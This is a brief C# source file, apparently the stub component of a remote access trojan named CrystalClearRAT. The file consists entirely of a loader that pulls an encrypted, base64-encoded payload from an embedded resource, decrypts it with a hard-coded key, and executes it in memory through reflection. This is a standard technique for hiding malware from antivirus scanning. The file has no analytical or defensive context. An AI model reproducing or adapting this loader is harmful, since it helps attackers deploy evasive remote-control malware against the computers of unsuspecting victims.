using System;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace CrystalClearRAT.Stub
{
   
    class Program
    {



        public static void Main(string[] args)
        {

            var assembly = Assembly.GetExecutingAssembly();
            string resourceName = assembly.GetManifestResourceNames().Single(str => str.EndsWith("payload.txt"));

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();
                byte[] code = Convert.FromBase64String(StringCipher.Decrypt(result, "123"));

               Assembly exeAssembly = Assembly.Load(code);
                exeAssembly.EntryPoint.Invoke(null, null);


            }

                  
        }
    }
}
